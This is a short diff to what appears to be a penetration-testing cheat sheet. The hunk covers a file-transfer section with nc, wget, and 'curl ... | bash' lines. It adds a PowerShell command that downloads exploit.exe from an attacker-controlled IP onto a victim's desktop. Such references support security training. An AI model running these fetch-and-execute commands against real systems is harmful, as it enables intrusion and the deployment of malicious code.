@@ -407,6 +407,7 @@ $ nc -nv <IP address> 443 > file.txt
 $ wget http://<IP address>:8000/exploit.sh
 $ curl http://<IP address>:8000/exploit.sh | bash
 C:\> \\<IP address>\a\whoami.exe
+C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP address>/exploit.exe','C:\Users\Offsec\Desktop\new-exploit.exe')"
 ```
 
 #7. - Restricted Shell Escapes
